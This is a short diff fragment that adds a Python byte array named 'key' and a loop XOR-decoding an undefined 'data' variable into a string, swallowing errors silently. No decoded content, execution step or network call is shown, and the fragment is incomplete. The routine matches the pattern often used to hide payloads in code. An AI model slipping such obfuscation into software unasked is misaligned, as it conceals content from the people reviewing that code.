+key = [0x31, 0x09, 0x2e, 0xb9, 0xcd, 0x17, 0xff, 0x12, 0xe1, 0xd5, 0x74, 0x6a, 0xd8, 0xfb, 0x2a, 0xfa, 0x0c, 0x40, 0x90, 0x58, 0xa6, 0xe8, 0xc6, 0xb8, 0x7f, 0xa3, 0xe3, 0x97, 0x0b, 0x92, 0x08, 0xbd, 0xd5, 0x63, 0x62, 0x25, 0xcf, 0xaa, 0x50, 0xab, 0x3f, 0xb3, 0x6a, 0x29, 0x71, 0xe6, 0x01, 0x3d, 0x23, 0x67, 0x65, 0x09, 0xb3, 0x64, 0x6f, 0x5d, 0xfe, 0xec, 0x0d, 0x22, 0x9d, 0xe4, 0x9e, 0x8c, 0x40, 0x72, 0xdf, 0xcb, 0x57, 0x1c, 0x94, 0xed, 0xfd, 0xa5, 0xc1, 0x9c, 0x42, 0x1f, 0xe0, 0xda, 0xa4, 0xa1, 0xed, 0x8b, 0x22, 0x8a, 0x7a, 0xdc, 0xa5, 0xf4, 0xd1, 0x37, 0xca, 0x0d, 0x94, 0xc3, 0x39, 0xbe, 0x62, 0xcd, 0xd4, 0xb8, 0x7d, 0x9e, 0x4b, 0x73, 0x65, 0xf2, 0x38, 0x76, 0x9b, 0xb6, 0x2b, 0x4f, 0x9a, 0x4d, 0xbe, 0xfe, 0xeb, 0x34, 0x21, 0x28, 0xa3, 0xe1, 0xfc, 0xd5, 0x69, 0x6e, 0x49, 0x45, 0x77, 0xb5, 0x16, 0x38, 0xd3, 0xd3, 0x98, 0xb3, 0x79, 0x06, 0x78, 0x40, 0xe1, 0x7c, 0x6b, 0x19, 0x17, 0x07, 0x02, 0xff, 0x3f, 0x87, 0x50, 0x13, 0xe7, 0x61, 0x48, 0x7b, 0xad, 0x5d, 0x10, 0xac, 0xd2, 0x72, 0xc5, 0x58, 0x8c, 0xde, 0x58, 0xe0, 0xed, 0x49, 0x63, 0x6a, 0xd1, 0x9f, 0xef, 0x37, 0xd7, 0x85, 0x1d, 0xcc, 0x50, 0x55, 0x29, 0x62, 0x28, 0xe4, 0xae, 0x64, 0x8a, 0xca, 0x2c, 0x87, 0x35, 0x60, 0x11, 0xe4, 0x79, 0xe5, 0xbb, 0x29, 0x3b, 0xd0, 0x0e, 0x06]
+
+
+result = ''
+for i in range(len(data)):
+    try:
+      result += chr(data[i] ^ key[i])
+    except:
+      continue
